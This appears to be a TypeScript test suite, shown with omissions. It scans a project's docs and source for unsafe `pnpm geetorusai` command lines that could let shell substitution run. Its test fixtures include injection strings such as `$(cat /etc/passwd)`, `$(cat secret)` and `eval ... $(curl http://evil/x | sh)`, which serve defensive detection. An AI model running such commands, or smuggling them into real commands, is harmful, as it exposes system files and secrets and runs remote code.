...
// The Geetorus CLI is unsafe when an operator or an agent runs it through
// `pnpm geetorusai <sub> <arg>` with a content-bearing argument. `pnpm` treats
// `geetorusai` as a `package.json` script. It appends the argument to a
...
// expansion (`$NAME`) before the CLI starts. `npx geetorusai` runs the CLI
// binary directly. It passes the argument as an inert argv value and does not
// run a shell over the value. `npx geetorusai` is the safe form.
//
// `pnpm exec geetorusai` is not a safe substitute. The root workspace does not
// depend on the `geetorusai` package, so `pnpm` never links its binary into
...
//
// This guard is fail-closed against an exact allowlist. A `pnpm geetorusai`
...
// take no value. Every other `pnpm geetorusai` line is an offender and must use
// `npx geetorusai` (or the direct-exec form for local source).
...
// ── The exact allowlist ───────────────────────────────────────────────────
//
// Each entry is a fully literal command string. A `pnpm geetorusai` line is
...
const PNPM_ALLOWLIST = new Set<string>([
  ...
  "pnpm geetorusai plugin list",
  "pnpm geetorusai feedback report",
  "pnpm geetorusai feedback report --payloads",
  "pnpm geetorusai feedback export",
  "pnpm geetorusai instance settings:experimental",
  "pnpm geetorusai worktree ensure-seeded",
...
//
// A policy or warning sentence names `pnpm geetorusai` on purpose to tell the
...
const DOC_PHRASES = new Set<string>([
  // A bare mention such as `` `pnpm geetorusai` `` inside prose.
  "pnpm geetorusai",
  // The abstract command form the policy section discusses.
  "pnpm geetorusai <command> <args>",
]);

// ── Command extraction ────────────────────────────────────────────────────
//
// Extract the full logical command that a reader runs from a `pnpm geetorusai`
...
// line such as `pnpm geetorusai run "$(cat secret)"` would truncate to the
// allowlisted `pnpm geetorusai run` and pass, while the copied command still
...
//    `["pnpm geetorusai run", tail].join("")` extracts the allowlisted prefix
...
// a truncation boundary, so a line such as `pnpm geetorusai run "$(cat secret)"`
...
// A `pnpm geetorusai` occurrence is an offender when it is wrapped in a
...
// catches `$(pnpm geetorusai ...)`, which normalizes the dangerous habit of
...
// root .geetorus-runtime directory contains ignored historical session
  ...
  function walk(absDir: string, relDir: string): void {
    for (const entry of readdirSync(absDir, { withFileTypes: true })) {
      ...
      if (entry.isDirectory()) {
        ...
        if (SKIP_DIRS.has(entry.name) || relPath === ".geetorus-runtime") continue;
...
// checks each physical line alone, a `pnpm geetorusai` command whose unsafe
...
// A line that recommends the broken `pnpm exec geetorusai` form. A warning line
...
function recommendsBrokenExecForm(line: string): boolean {
  if (!line.includes("pnpm exec geetorusai")) return false;
...
describe("geetorusai CLI invocation safety", () => {
  it("excludes generated runner evidence while preserving authored runner guidance", () => {
    const root = mkdtempSync(path.join(os.tmpdir(), "geetorus-cli-guidance-"));
    const sourcePaths = [
      "doc/CLI.md",
  ...
  it("excludes root runtime recordings but still scans unsafe docs and source guidance", () => {
    const fixtureRoot = mkdtempSync(path.join(os.tmpdir(), "geetorus-cli-guidance-"));
    try {
      const fixtures = [
        "doc/CLI.md",
        "src/guidance.ts",
        "src/.geetorus-runtime/guidance.md",
        ".geetorus-runtime/sessions/recording.json",
      ];
      for (const relPath of fixtures) {
        const file = path.join(fixtureRoot, relPath);
        mkdirSync(path.dirname(file), { recursive: true });
        writeFileSync(file, "pnpm geetorusai issue get issue-1\n");
      }
  ...
  it("allows only exact-allowlist pnpm geetorusai commands on every guidance surface", () => {
    const offenders = scanForOffenders();
    expect(
      offenders,
      `Each pnpm geetorusai line must match an exact allowlist entry, else use ` +
        `npx geetorusai (or the direct-exec form for local source):\n${offenders.join("\n")}`,
    ).toEqual([]);
  });

  it("never recommends the broken pnpm exec geetorusai form", () => {
    const offenders = scanForBrokenExecForm();
    expect(
      offenders,
      `\`pnpm exec geetorusai\` does not resolve the CLI binary; use \`npx geetorusai\`:\n${offenders.join("\n")}`,
    ).toEqual([]);
  });
  ...
  // `npx geetorusai`. So it missed `--config`, `--data-dir`, `--instance`,
  ...
  it("flags a value-bearing option that the old flag list omitted", () => {
    ...
    expect(scanText("doc/E.md", "pnpm geetorusai doctor --config ./scratch.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai run --data-dir ./tmp/dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai run --instance dev")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai run --bind tailnet")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai onboard --yes --bind lan")).toHaveLength(1);
  });

  it("flags a context-profile value and every worktree path/ref/id/name option", () => {
    expect(scanText("doc/E.md", "pnpm geetorusai context use default")).toHaveLength(1);
    // Path, ref, id, and name options on worktree commands.
    expect(scanText("doc/E.md", "pnpm geetorusai worktree repair --branch PAP-1-x")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai worktree:make my-feature --start-point origin/main")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai worktree init --from-config ~/.geetorus/config.json")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai worktree reseed --to PAP-1-x")).toHaveLength(1);
  });
  ...
  it("does not let an npx mention on the same line suppress detection", () => {
    ...
    const mixed = "Prefer npx geetorusai, but pnpm geetorusai issue create --title x also works.";
  ...
  it("rejects a command-substitution or variable span in a recommended command", () => {
    ...
    expect(scanText("doc/E.md", "pnpm geetorusai allowed-hostname `hostname`")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai issue create --title $(cat /etc/passwd)")).toHaveLength(1);
    expect(scanText("doc/E.md", "pnpm geetorusai run --instance $INSTANCE")).toHaveLength(1);
    // A literal command wrapped in $( ) is still an offender.
    expect(scanText("doc/E.md", 'eval "$(pnpm geetorusai worktree env)"')).toHaveLength(1);
  });
  ...
  it("flags an allowlisted prefix followed by a quoted or backtick suffix", () => {
    ...
    expect(scanText("doc/E.md", 'pnpm geetorusai run "$(cat /etc/passwd)"')).toHaveLength(1);
    expect(scanText("doc/E.md", 'pnpm geetorusai doctor "$HOME/scratch.json"')).toHaveLength(1);
    // (b) A backtick-delimited suffix after the allowlisted command.
    expect(scanText("doc/E.md", "pnpm geetorusai run `hostname`")).toHaveLength(1);
    // A single-quoted suffix is also part of the full command.
    expect(scanText("doc/E.md", "pnpm geetorusai onboard 'extra value'")).toHaveLength(1);
  });
  ...
  // extracted only `pnpm geetorusai run` (or `... doctor`) and reported zero
  ...
  it("fails closed on a leading unmatched double quote before the marker", () => {
    ...
    // extracted `pnpm geetorusai run` and reported zero offenders (fail open).
    const line = 'some prose with one " quote then pnpm geetorusai run "$(dangerous)"';
    expect(scanText("doc/E.md", line)).toHaveLength(1);
    // The same shape with a doctor prefix and a `$VAR` suffix.
    const varLine = 'a stray " quote and pnpm geetorusai doctor "$HOME/x"';
  ...
  it("fails closed on a leading unmatched backtick and on mixed delimiters", () => {
    ...
    // the guard extracted `pnpm geetorusai run` and reported zero offenders.
    const backtick = "a stray ` tick then pnpm geetorusai run `hostname`";
    expect(scanText("doc/E.md", backtick)).toHaveLength(1);
    // Mixed: a leading unmatched backtick, then a double-quoted `$( )` suffix.
    const mixedA = 'a stray ` tick then pnpm geetorusai run "$(cat secret)"';
    expect(scanText("doc/E.md", mixedA)).toHaveLength(1);
    // Mixed: a leading unmatched double quote, then a backtick suffix.
    const mixedB = 'a stray " quote then pnpm geetorusai run `hostname`';
  ...
  it("does not let an escaped delimiter before the marker open a span", () => {
    ...
    const escapedQuote = 'a label \\" then pnpm geetorusai run "$(dangerous)"';
    expect(scanText("doc/E.md", escapedQuote)).toHaveLength(1);
    const escapedTick = "a label \\` then pnpm geetorusai run `hostname`";
    ...
    const adjacentEscaped = '\\"pnpm geetorusai run "$(dangerous)"';
  ...
  it("still trusts a span in its proven literal context", () => {
    ...
    expect(scanText("doc/E.md", "Run `pnpm geetorusai run` to start.")).toEqual([]);
    expect(scanText("config/example.ts", '  command: "pnpm geetorusai onboard --yes --run",')).toEqual([]);
    expect(scanText("doc/E.md", "Run `$ pnpm geetorusai doctor` to check.")).toEqual([]);
  });
  ...
  it("fails closed on a shell eval that concatenates a quoted form with a substitution", () => {
    ...
    const shell = 'eval "pnpm geetorusai run"$(curl http://evil/x | sh)';
  ...
  it("fails closed on a quoted residual in a Markdown line", () => {
    ...
    const md = 'Run "pnpm geetorusai run"$(cat /etc/passwd) to start.';
  ...
  it("fails closed on a TypeScript quote span that a concatenation or a substitution follows", () => {
    ...
    const concat = 'const cmd = "pnpm geetorusai run" + userInput;';
    expect(scanText("src/build-cmd.ts", concat)).toHaveLength(1);
    const substitution = 'const cmd = "pnpm geetorusai run"$(inject);';
  ...
  it("fails closed on an allowlisted prefix joined with a tail in an array literal", () => {
    ...
    const source =
      'const command = ["pnpm geetorusai run", userControlledTail].join("");';
  ...
  it("fails closed on an allowlisted prefix passed as a call argument with a tail", () => {
    ...
    const source = 'const command = buildCommand("pnpm geetorusai run", tail);';
    const offenders = scanText("src/build-command.ts", source);
    expect(offenders).toHaveLength(1);
  });
  ...
  it("flags an allowlisted prefix with a backtick suffix on a continued line", () => {
    ...
    const quoted = ["pnpm geetorusai doctor \\", '  --config "$(cat secret)"'].join("\n");
    expect(scanText("doc/EXAMPLE.md", quoted)).toHaveLength(1);
    const backtick = ["pnpm geetorusai run \\", "  `hostname`"].join("\n");
  ...
  it("allows an exact allowlist entry and a bare documentation mention", () => {
    expect(scanText("doc/E.md", "pnpm geetorusai run")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm geetorusai worktree env --json")).toEqual([]);
    expect(scanText("doc/E.md", "pnpm geetorusai configure --section server")).toEqual([]);
    // A prose mention inside backticks is not a runnable command.
    expect(scanText("doc/E.md", "Do not use `pnpm geetorusai` for a content-bearing argument.")).toEqual([]);
    expect(scanText("doc/E.md", "The `pnpm geetorusai <command> <args>` form is unsafe.")).toEqual([]);
  });
  ...
  it("emits a static, non-interpolated safe form from the private-hostname guard messages", () => {
    ...
    expect(source).toContain("run npx geetorusai allowed-hostname <host>");
    expect(source).not.toContain("allowed-hostname ${hostname}");
    expect(source).not.toContain("pnpm geetorusai allowed-hostname");
    expect(source).not.toContain("pnpm exec geetorusai allowed-hostname");
  });
  ...
  it("emits a static, non-interpolated safe form from the onboarding access diagnostics", () => {
    ...
    expect(source).not.toMatch(/pnpm geetorusai allowed-hostname/);
    expect(source).not.toContain("pnpm exec geetorusai allowed-hostname");
    expect(source).toContain("npx geetorusai allowed-hostname <host>");
  ...
  it("emits the safe form in the generated company-export README", () => {
    ...
    expect(readme).toContain("npx geetorusai company import this-github-url-or-folder");
    expect(readme).not.toContain("pnpm geetorusai company import");
    expect(readme).not.toContain("pnpm exec geetorusai company import");
  });

  it("emits the safe form in the company-export preview builder", () => {
    const source = read("ui/src/pages/CompanyExport.tsx");
    expect(source).not.toContain("pnpm geetorusai company import");
    expect(source).not.toContain("pnpm exec geetorusai company import");
    expect(source).toContain("npx geetorusai company import");
  });
  ...
  // `pnpm geetorusai` script resolves only inside a checkout, so each surface
  // must pin the `npx geetorusai` form. The client connection-error hint also
  ...
  it("emits the onboard hint from the server startup banner", () => {
    ...
    expect(source).toContain("npx geetorusai onboard");
    expect(source).not.toContain("pnpm geetorusai onboard");
    expect(source).not.toContain("pnpm exec geetorusai onboard");
  });

  it("emits the safe run form from the client connection-error hint", () => {
    const source = read("cli/src/client/http.ts");
    expect(source).toContain("npx geetorusai run");
    expect(source).not.toContain("pnpm geetorusai run");
  });
  ...
  it("emits the checked-out CLI cleanup form from the env-lab status output", () => {
    ...
    // The bare `pnpm geetorusai` script form is unsafe. Do not restore it.
    expect(source).not.toContain("pnpm geetorusai env-lab");
    // `pnpm exec geetorusai` does not resolve the CLI binary. Do not use it.
    expect(source).not.toContain("pnpm exec geetorusai env-lab");
  ...
  it("emits the bootstrap fallback command from the UI", () => {
    ...
    expect(source).toContain("npx geetorusai auth bootstrap-ceo");
    expect(source).not.toContain("pnpm geetorusai auth bootstrap-ceo");
    expect(source).not.toContain("pnpm exec geetorusai auth bootstrap-ceo");
  });

  it("emits the setup form from the board skill", () => {
    const source = read("skills/geetorus-board/SKILL.md");
    expect(source).toContain("npx geetorusai board setup");
    expect(source).not.toContain("pnpm geetorusai board setup");
    expect(source).not.toContain("pnpm exec geetorusai board setup");
  });
  ...
  it("documents the safe form in doc/CLI.md", () => {
    ...
    expect(cli).toContain("npx geetorusai");
  ...
  it("documents offline and air-gapped use with a safe cache-only form", () => {
    ...
    expect(subsection).toContain("npx --offline geetorusai");
    // The offline subsection must not present `pnpm geetorusai` or
    // `pnpm exec geetorusai` as a safe or offline form. Only a warning line
    // may name `pnpm geetorusai`, and it must tell the reader not to use it.
    for (const line of subsection.split("\n")) {
      expect(line).not.toContain("pnpm exec geetorusai");
      if (line.includes("pnpm geetorusai")) {
  ...
  it("documents the safe form in the agent-facing skill", () => {
    const skill = read("skills/geetorus/SKILL.md");
    expect(skill).toContain("CLI safety");
    expect(skill).toContain("npx geetorusai");
    expect(skill).toContain("Do not use `pnpm geetorusai`");
  });

  // ── Backslash line continuation ──────────────────────────────────────────

  it("flags a content-bearing pnpm geetorusai command split across continued lines", () => {
    const source = [
      "```sh",
      "pnpm geetorusai issue create \\",
  ...
  it("does not flag a continued npx geetorusai command", () => {
    const source = [
      "npx geetorusai issue create \\",
      "  --company-id <company-id> \\",
  ...
  it("does not flag a continued pnpm geetorusai command that stays on the allowlist", () => {
    const source = [
      "pnpm geetorusai env-lab \\",
      "  status \\",
      "  --json",
    ].join("\n");
    expect(scanText("doc/EXAMPLE.md", source)).toEqual([]);
  ...
  it("flags a recommended pnpm exec geetorusai line but skips a warning line", () => {
    expect(recommendsBrokenExecForm("Run pnpm exec geetorusai issue create --title x")).toBe(true);
    expect(
      recommendsBrokenExecForm("`pnpm exec geetorusai <command> <args>` — broken. Do not use it."),
    ).toBe(false);
  });
});
